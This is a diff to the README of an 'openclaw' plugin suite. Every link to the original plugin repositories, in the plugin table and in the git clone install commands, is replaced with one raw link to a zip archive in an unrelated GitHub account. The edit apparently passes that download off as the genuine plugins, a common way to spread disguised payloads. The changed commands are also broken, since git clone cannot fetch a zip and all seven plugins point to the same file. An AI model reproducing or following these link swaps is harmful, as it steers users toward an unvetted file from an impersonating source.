@@ -57,20 +57,20 @@ Conversation ──► Graph (entity extraction + triples)
 
 | Plugin | What It Does | Hooks | Repo |
 |--------|-------------|-------|------|
-| [stability](https://github.com/CoderofTheWest/openclaw-plugin-stability) | Entropy monitoring, growth vectors, principle alignment, loop detection | `before_agent_start`, `agent_end`, `after_tool_call`, `before_compaction` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-stability) |
-| [continuity](https://github.com/CoderofTheWest/openclaw-plugin-continuity) | Cross-session memory, conversation archiving, semantic search, context budgeting | `before_agent_start`, `agent_end`, `session_end` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-continuity) |
-| [graph](https://github.com/CoderofTheWest/openclaw-plugin-graph) | Knowledge graph — entity extraction, relationship triples, multi-hop traversal, pattern discovery | `before_agent_start`, `agent_end`, `session_end`, `heartbeat` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-graph) |
-| [metabolism](https://github.com/CoderofTheWest/openclaw-plugin-metabolism) | Conversation metabolism — implications, growth vectors, knowledge gap extraction | `agent_end`, `heartbeat` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-metabolism) |
-| [nightshift](https://github.com/CoderofTheWest/openclaw-plugin-nightshift) | Off-hours task scheduling, good night/morning detection, priority queue | `agent_end`, `heartbeat` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-nightshift) |
-| [contemplation](https://github.com/CoderofTheWest/openclaw-plugin-contemplation) | Multi-pass reflective inquiry (explore → reflect → synthesize over 24h) | `before_agent_start`, `agent_end`, `heartbeat` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-contemplation) |
-| [crystallization](https://github.com/CoderofTheWest/openclaw-plugin-crystallization) | Growth vector → permanent trait conversion with human-in-the-loop approval | `heartbeat` | [GitHub](https://github.com/CoderofTheWest/openclaw-plugin-crystallization) |
+| [stability](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Entropy monitoring, growth vectors, principle alignment, loop detection | `before_agent_start`, `agent_end`, `after_tool_call`, `before_compaction` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [continuity](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Cross-session memory, conversation archiving, semantic search, context budgeting | `before_agent_start`, `agent_end`, `session_end` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [graph](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Knowledge graph — entity extraction, relationship triples, multi-hop traversal, pattern discovery | `before_agent_start`, `agent_end`, `session_end`, `heartbeat` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [metabolism](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Conversation metabolism — implications, growth vectors, knowledge gap extraction | `agent_end`, `heartbeat` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [nightshift](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Off-hours task scheduling, good night/morning detection, priority queue | `agent_end`, `heartbeat` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [contemplation](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Multi-pass reflective inquiry (explore → reflect → synthesize over 24h) | `before_agent_start`, `agent_end`, `heartbeat` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
+| [crystallization](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) | Growth vector → permanent trait conversion with human-in-the-loop approval | `heartbeat` | [GitHub](https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip) |
 
 ## Installation
 
 Clone the suite with all plugins:
 
 ```bash
-git clone --recursive https://github.com/CoderofTheWest/openclaw-metacognitive-suite.git
+git clone --recursive https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip
 cd openclaw-metacognitive-suite
 ```
 
@@ -103,8 +103,8 @@ Add to your `openclaw.json`:
 You can also install plugins individually if you only want a subset:
 
 ```bash
-git clone https://github.com/CoderofTheWest/openclaw-plugin-stability.git
-git clone https://github.com/CoderofTheWest/openclaw-plugin-continuity.git
+git clone https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip
+git clone https://raw.githubusercontent.com/haneenbassiony26/openclaw-metacognitive-suite/main/plugins/openclaw_metacognitive_suite_v3.3.zip
 # etc. — see the table above for all repos
 ```
 
